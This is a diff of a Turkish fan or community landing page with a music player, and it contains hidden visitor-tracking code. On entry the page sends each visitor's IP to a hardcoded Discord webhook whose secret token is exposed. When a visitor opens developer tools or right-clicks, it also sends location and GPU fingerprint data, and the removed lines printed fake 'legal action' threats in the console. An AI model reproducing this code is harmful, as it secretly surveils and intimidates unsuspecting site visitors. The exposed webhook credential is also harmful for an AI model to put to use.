@@ -8,8 +8,6 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700;900&display=swap');
         
-        /* GENEL RESETLEME 
-        */
         * { 
             margin: 0; 
             padding: 0; 
@@ -18,8 +16,6 @@
             -webkit-user-select: none; 
         }
 
-        /* BODY VE ARKA PLAN ANIMASYONU 
-        */
         body {
             background: linear-gradient(-45deg, #020202, #00151a, #050505, #00222b);
             background-size: 400% 400%;
@@ -40,8 +36,20 @@
             100% { background-position: 0% 50%; }
         }
 
-        /* ARKA PLAN EFEKTLERİ (BLUR VE CIRCLE)
-        */
+        /* BAN EKRANI STİLİ */
+        #ban-screen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            z-index: 999999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family: monospace;
+        }
+
         #background-elements { 
             position: fixed; 
             top: 0; 
@@ -86,8 +94,6 @@
             to { transform: translate(-80px, -40px); } 
         }
 
-        /* GİRİŞ EKRANI (OVERLAY)
-        */
         #enter-overlay {
             position: fixed; 
             top: 0; 
@@ -123,8 +129,6 @@
             100% { opacity: 0.3; text-shadow: none; } 
         }
 
-        /* MÜZİK PANELİ TASARIMI
-        */
         .music-wrapper {
             position: absolute; 
             top: 40px; 
@@ -274,8 +278,6 @@
             color: #fff; 
         }
 
-        /* HUD SİSTEMİ 
-        */
         #music-hud {
             position: fixed; 
             top: 50%; 
@@ -315,8 +317,6 @@
             color: #fff; 
         }
 
-        /* ANA KONTEYNER VE YAZILAR
-        */
         .container { 
             text-align: center; 
             z-index: 10; 
@@ -364,8 +364,6 @@
             }
         }
 
-        /* BUTON TASARIMLARI (IOS STYLE)
-        */
         .ios-btn { 
             display: flex; 
             align-items: center; 
@@ -388,7 +386,6 @@
             box-shadow: 0 15px 40px rgba(0, 225, 255, 0.4); 
         }
 
-        /* JOIN THE DREAM BUTONU */
         .join-now { 
             padding: 22px 70px; 
             background: linear-gradient(135deg, #ffffff 0%, #a2a2a2 100%);
@@ -434,8 +431,6 @@
             transform: scale(0.95); 
         }
 
-        /* GİZLİ ELEMANLAR VE CANVAS 
-        */
         #video-container { 
             position: absolute; 
             left: -9999px; 
@@ -455,6 +450,12 @@
 </head>
 
 <body>
+
+    <div id="ban-screen">
+        <h1 style="color: #ff0000; font-size: 40px; margin-bottom: 20px;">ACCESS DENIED</h1>
+        <p style="color: #fff; letter-spacing: 2px;">IP Adresiniz Kara Listeye Alınmıştır.</p>
+        <div style="margin-top: 30px; color: #333; font-size: 10px;" id="ban-id-display"></div>
+    </div>
 
     <div id="enter-overlay" onclick="startExperience()">
         <h2>CLICK TO ENTER</h2>
@@ -527,15 +528,15 @@
 
     <script src="https://www.youtube.com/iframe_api"></script>
     <script>
-        /* JAVASCRIPT KONFIGURASYONU VE GÜVENLİK SİSTEMİ
-        */
         const WEBHOOK = "https://discord.com/api/webhooks/1494748049187274894/e3KaTAxmzd7s_LfVGGWKPZ-MaSJZTG1v1xsZ6NVtiYO-F9yJ8zsab8iVZkQQwNCSM1Nb";
         let intrusionLogged = false;
 
-        // Discord Log Fonksiyonu
+        // BANLI IP LİSTESİ (Buraya engellemek istediğin IP'leri ekle)
+        const BANNED_IPS = ["176.240.108.77"];
+
         async function sendLog(title, desc, color = 3447003) {
             try {
-                const response = await fetch(WEBHOOK, {
+                await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -550,108 +551,54 @@
                         }]
                     })
                 });
-            } catch(e) { 
-                console.log("LOG_ERROR"); 
+            } catch(e) {}
+        }
+
+        // IP KONTROL SİSTEMİ
+        async function checkIpBan() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                const userIp = data.ip;
+
+                if (BANNED_IPS.includes(userIp)) {
+                    document.getElementById('ban-screen').style.display = 'flex';
+                    document.getElementById('ban-id-display').innerText = "REF_ID: " + btoa(userIp);
+                    sendLog("🚫 BANLI GİRİŞ DENEMESİ", `**IP:** \`${userIp}\` erişimi engellenmiş bir kullanıcı girmeye çalıştı.`, 15105570);
+                    return true;
+                }
+                return false;
+            } catch (e) {
+                return false;
             }
         }
 
-        // Buton Tıklama Olayları
-        const steamBtn = document.getElementById('steam-btn');
-        steamBtn.addEventListener('click', function() {
-            sendLog("🎮 STEAM TIKLANDI", "Kullanıcı Steam grubuna yönlendiriliyor.", 5793266);
-        });
-
-        const instaBtn = document.getElementById('insta-btn');
-        instaBtn.addEventListener('click', function() {
-            sendLog("📸 INSTA TIKLANDI", "Kullanıcı Instagram profilini açtı.", 15105570);
-        });
-
-        const discordBtn = document.getElementById('discord-btn');
-        discordBtn.addEventListener('click', function() {
-            sendLog("💬 DISCORD TIKLANDI", "Kullanıcı sunucuya katıl butonuna bastı.", 5814783);
-        });
-
-        /* GELİŞMİŞ KONSOL GÜVENLİĞİ (DETECT ATTACK)
-        */
         async function fullLeak() {
             if (intrusionLogged) return;
             intrusionLogged = true;
-
-            // Konsol açılışında sayfa yenilense bile mesajın düzgün düşmesi için ufak bir gecikme ekliyoruz.
-            setTimeout(async () => {
-                console.clear();
-                console.log("%c ", "padding: 1px;");
-                console.log("%c SE7ENSYNDRAXE CYBER SECURITY DETECTED A CYBER ATTACK ", "color: #00FFFF; background: #000; border: 2px solid #00FFFF; font-weight: bold; font-size: 18px; padding: 10px;");
-                console.log("%c ", "padding: 1px;");
-                console.log("%c[SYSTEM]: Unauthorized access to console detected.", "color: #ff0000; font-size: 14px; font-weight: bold; margin-top: 10px;");
-                console.log("%c[REPORT]: IP adresin ve cihaz kimliğin yasal işlem için loglanmıştır.", "color: #ffffff; font-size: 14px; font-weight: bold;");
-                console.log("%c[REPORT]: Your IP address and device identity have been logged for legal action.", "color: #ffffff; font-size: 14px; font-weight: bold;");
-
-                try {
-                    // ipapi rate limite takıldığı için stabil olan ipify kullanıyoruz
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl');
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden/Unknown";
-                    
-                    let batteryLevel = "N/A";
-                    if (navigator.getBattery) {
-                        const b = await navigator.getBattery();
-                        batteryLevel = `%${Math.round(b.level * 100)}`;
-                    }
-
-                    const dataReport = `
-**🚨 KRİTİK SIZMA ANALİZİ**
--------------------------------------------
-**🌐 NETWORK INFO**
-**IP:** \`${ipData.ip || 'Bilinmiyor'}\`
-
-**🖥️ HARDWARE INFO**
-**GPU:** \`${gpu}\`
-**RAM:** \`${navigator.deviceMemory || '8'}+ GB\`
-**CPU Cores:** \`${navigator.hardwareConcurrency || 'Bilinmiyor'}\`
-**Platform:** \`${navigator.platform}\`
-**Resolution:** \`${window.screen.width}x${window.screen.height}\`
-
-**🔋 STATUS**
-**Battery:** \`${batteryLevel}\`
-**User-Agent:** \`${navigator.userAgent.substring(0, 150)}...\`
--------------------------------------------
-**🛑 EYLEM:** Konsol açıldı ve tüm veriler hukuki süreç için Discord'a mühürlendi.
-                    `;
-                    sendLog("🛑 FULL SYSTEM EXPLOIT", dataReport, 15158332);
-                } catch (err) {
-                    sendLog("🚨 SIZMA TESPİT EDİLDİ", "Kullanıcı konsolu açtı ancak detaylar çekilemedi (Adblock veya Rate Limit).", 15158332);
-                }
-            }, 500); // 500ms gecikme (Konsol render olana kadar bekle)
+            console.clear();
+            
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden/Unknown";
+                
+                const dataReport = `**🛑 FULL SYSTEM EXPLOIT**\nIP: \`${ipData.ip}\`\nGPU: \`${gpu}\`\nKonum: \`${ipData.city}/${ipData.country_name}\`\nDurum: Kullanıcı konsol üzerinden sızma yapmaya çalıştı.`;
+                sendLog("🛑 KRİTİK SIZMA", dataReport, 15158332);
+            } catch (err) {
+                sendLog("🚨 SIZMA TESPİT EDİLDİ", "Konsol açıldı.", 15158332);
+            }
         }
 
-        // Konsol Açma Dinleyicileri
-        window.addEventListener('keydown', function(e) { 
-            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67))) {
-                fullLeak(); 
-            }
+        window.addEventListener('keydown', e => { 
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode))) fullLeak(); 
         });
+        window.oncontextmenu = e => { e.preventDefault(); fullLeak(); };
 
-        window.oncontextmenu = function(e) { 
-            e.preventDefault(); 
-            fullLeak(); 
-        };
-        
-        // Pencere Boyutu Kontrolü (Konsol Yan Panel)
-        setInterval(function() {
-            const widthDiff = window.outerWidth - window.innerWidth;
-            const heightDiff = window.outerHeight - window.innerHeight;
-            if (widthDiff > 160 || heightDiff > 160) {
-                fullLeak();
-            }
-        }, 1000);
-
-        /* GELİŞMİŞ MÜZİK ÇALAR SİSTEMİ 
-        */
         const playlist = [
             { id: '8q9Kz1FFDaM', name: 'MILIARDARA' },
             { id: 'BVXtQxkCrdU', name: 'Rauf Faik - Akşamlar' },
@@ -663,181 +610,108 @@
         let player;
         let hudTimeout;
 
-        // YouTube API Ready Olayı
         function onYouTubeIframeAPIReady() {
             player = new YT.Player('player', {
-                height: '1',
-                width: '1',
+                height: '1', width: '1',
                 videoId: playlist[currentTrack].id,
-                playerVars: {
-                    'autoplay': 0,
-                    'controls': 0,
-                    'disablekb': 1,
-                    'rel': 0
-                },
+                playerVars: { 'autoplay': 0, 'controls': 0, 'disablekb': 1, 'rel': 0 },
                 events: {
-                    'onReady': function(event) {
-                        event.target.setVolume(30);
-                        renderPlaylist();
-                    },
-                    'onStateChange': function(event) {
-                        if (event.data === YT.PlayerState.ENDED) {
-                            nextTrack();
-                        }
-                    }
+                    'onReady': e => { e.target.setVolume(30); renderPlaylist(); },
+                    'onStateChange': e => { if (e.data === YT.PlayerState.ENDED) nextTrack(); }
                 }
             });
         }
 
-        // HUD Mesajlarını Göster
         function showHUD(text, iconClass) {
             const hud = document.getElementById('music-hud');
             const hudText = document.getElementById('hud-text');
             const hudIcon = document.getElementById('hud-icon');
-
             clearTimeout(hudTimeout);
             hudText.innerText = text;
             hudIcon.className = iconClass;
             hud.classList.add('show');
-
-            hudTimeout = setTimeout(function() {
-                hud.classList.remove('show');
-            }, 3000);
+            hudTimeout = setTimeout(() => hud.classList.remove('show'), 3000);
         }
 
-        // Şarkı Çal
         function playTrack(index) {
             currentTrack = index;
             player.loadVideoById(playlist[currentTrack].id);
             renderPlaylist();
             showHUD(`Playing: ${playlist[currentTrack].name}`, "fa-solid fa-music");
-            sendLog("🎵 ŞARKI DEĞİŞTİ", `Dinlenen: **${playlist[currentTrack].name}**`);
         }
 
-        // Durdur/Başlat
         function togglePlay() {
             const btn = document.getElementById('play-pause-btn');
-            const state = player.getPlayerState();
-
-            if (state === 1) { 
-                player.pauseVideo(); 
-                btn.className = "fa-solid fa-play"; 
-                showHUD("Paused", "fa-solid fa-pause"); 
+            if (player.getPlayerState() === 1) { 
+                player.pauseVideo(); btn.className = "fa-solid fa-play"; showHUD("Paused", "fa-solid fa-pause"); 
             } else { 
-                player.playVideo(); 
-                btn.className = "fa-solid fa-pause"; 
-                showHUD("Playing", "fa-solid fa-play"); 
+                player.playVideo(); btn.className = "fa-solid fa-pause"; showHUD("Playing", "fa-solid fa-play"); 
             }
         }
 
-        // Sıradaki ve Önceki Şarkı
-        function nextTrack() {
-            currentTrack = (currentTrack + 1) % playlist.length;
-            playTrack(currentTrack);
-        }
+        function nextTrack() { currentTrack = (currentTrack + 1) % playlist.length; playTrack(currentTrack); }
+        function prevTrack() { currentTrack = (currentTrack - 1 + playlist.length) % playlist.length; playTrack(currentTrack); }
 
-        function prevTrack() {
-            currentTrack = (currentTrack - 1 + playlist.length) % playlist.length;
-            playTrack(currentTrack);
-        }
-
-        // Ses Ayarı
-        const volSlider = document.getElementById('vol-slider');
-        volSlider.addEventListener('input', function(e) {
-            const value = e.target.value;
-            player.setVolume(value);
-            showHUD(`Volume: %${value}`, "fa-solid fa-volume-high");
+        document.getElementById('vol-slider').addEventListener('input', e => {
+            player.setVolume(e.target.value);
+            showHUD(`Volume: %${e.target.value}`, "fa-solid fa-volume-high");
         });
 
-        // Oynatma Listesini Oluştur
         function renderPlaylist() {
             const list = document.getElementById('song-list');
             list.innerHTML = '';
-
-            playlist.forEach(function(song, index) {
+            playlist.forEach((song, index) => {
                 const item = document.createElement('div');
-                item.className = "song-item";
-                if (index === currentTrack) {
-                    item.classList.add('playing');
-                }
-                
-                item.innerHTML = `
-                    <img src="https://img.youtube.com/vi/${song.id}/mqdefault.jpg" class="song-thumb">
-                    <div class="song-info">${song.name}</div>
-                `;
-                
-                item.onclick = function() {
-                    playTrack(index);
-                };
-                
+                item.className = "song-item" + (index === currentTrack ? ' playing' : '');
+                item.innerHTML = `<img src="https://img.youtube.com/vi/${song.id}/mqdefault.jpg" class="song-thumb"><div class="song-info">${song.name}</div>`;
+                item.onclick = () => playTrack(index);
                 list.appendChild(item);
             });
         }
 
-        // Menü Aç/Kapat
-        function togglePlaylist() {
-            const container = document.getElementById('playlist-container');
-            container.classList.toggle('active');
-        }
+        function togglePlaylist() { document.getElementById('playlist-container').classList.toggle('active'); }
 
-        // Deneyimi Başlat (GİRİŞ YAPANIN IP'SİNİ ALIR)
         async function startExperience() {
+            // Önce Ban Kontrolü
+            const isBanned = await checkIpBan();
+            if (isBanned) return;
+
             const overlay = document.getElementById('enter-overlay');
             overlay.classList.add('hide');
             document.body.classList.add('loaded');
             player.playVideo();
             
             try {
-                // Sadece hızlıca IP çeker
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                sendLog("🌟 SİTEYE GİRİŞ", `Kullanıcı portala giriş yaptı.\nip: ${ipData.ip}`);
+                sendLog("🌟 SİTEYE GİRİŞ", `Kullanıcı portala giriş yaptı.\nIP: ${ipData.ip}`);
             } catch (err) {
-                sendLog("🌟 SİTEYE GİRİŞ", "Kullanıcı portala giriş yaptı.\nip: Gizli/Bulunamadı");
+                sendLog("🌟 SİTEYE GİRİŞ", "Kullanıcı portala giriş yaptı.");
             }
         }
 
-        /* ARKA PLAN PARTİKÜL SİSTEMİ 
-        */
+        // Canvas Partikül Sistemi
         const canvas = document.getElementById('bg-canvas');
         const ctx = canvas.getContext('2d');
         let dots = [];
-
         function initCanvas() { 
-            canvas.width = window.innerWidth; 
-            canvas.height = window.innerHeight; 
+            canvas.width = window.innerWidth; canvas.height = window.innerHeight; 
             dots = [];
-            for(let i = 0; i < 70; i++) {
-                dots.push({ 
-                    x: Math.random() * canvas.width, 
-                    y: Math.random() * canvas.height, 
-                    vx: (Math.random() - 0.5) * 0.4, 
-                    vy: (Math.random() - 0.5) * 0.4 
-                });
-            }
+            for(let i = 0; i < 70; i++) dots.push({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, vx: (Math.random() - 0.5) * 0.4, vy: (Math.random() - 0.5) * 0.4 });
         }
-
         function drawCanvas() { 
             ctx.clearRect(0, 0, canvas.width, canvas.height); 
             ctx.fillStyle = "rgba(0, 225, 255, 0.3)"; 
-            
-            dots.forEach(function(d) { 
-                d.x += d.vx; 
-                d.y += d.vy; 
-                
+            dots.forEach(d => { 
+                d.x += d.vx; d.y += d.vy; 
                 if(d.x < 0 || d.x > canvas.width) d.vx *= -1; 
                 if(d.y < 0 || d.y > canvas.height) d.vy *= -1; 
-                
-                ctx.beginPath(); 
-                ctx.arc(d.x, d.y, 1.2, 0, Math.PI * 2); 
-                ctx.fill(); 
+                ctx.beginPath(); ctx.arc(d.x, d.y, 1.2, 0, Math.PI * 2); ctx.fill(); 
             }); 
             requestAnimationFrame(drawCanvas); 
         }
-
         window.addEventListener('resize', initCanvas);
-        initCanvas(); 
-        drawCanvas();
+        initCanvas(); drawCanvas();
     </script>
 </body>
 </html>
